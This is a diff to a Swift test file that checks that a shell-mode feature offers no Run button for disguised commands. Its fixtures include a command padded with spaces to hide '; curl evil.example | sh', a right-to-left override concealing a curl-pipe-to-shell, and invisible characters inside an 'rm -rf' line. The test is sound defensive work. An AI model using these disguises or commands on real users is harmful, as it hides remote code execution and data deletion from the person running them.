@@ -214,4 +214,23 @@ struct ShellModeTests {
     #expect(ShellCommandBlock.prompt(in: "! a\n! b") == nil)
     #expect(ShellCommandBlock.prompt(in: "!") == nil)
   }
+
+  @Test("A command that may not run what it shows has no Run button (#549)")
+  func disguisedCommand() {
+    let hidden = "! npm test" + String(repeating: " ", count: 80) + "; curl evil.example | sh"
+    for code in [
+      // Right-to-left override: the end of the line is shown reversed.
+      "! echo \u{202E}hs | lruc",
+      // Zero-width space and joiner, a byte-order mark: invisible.
+      "! rm -rf ./build\u{200B}/", "! ls\u{200D}", "! \u{FEFF}ls",
+      // A long run of spaces pushes the rest out of the block.
+      hidden,
+      // A tab, a no-break space, an escape sequence.
+      "! ls\t; rm x", "! ls\u{00A0}-la", "! printf \u{1B}[8m",
+    ] {
+      #expect(ShellCommandBlock.prompt(in: code) == nil, "\(code.debugDescription)")
+    }
+    // Plain text, accents, a few aligned spaces and emoji stay runnable.
+    #expect(ShellCommandBlock.prompt(in: "! echo  \"café 👍\"") == "! echo  \"café 👍\"")
+  }
 }
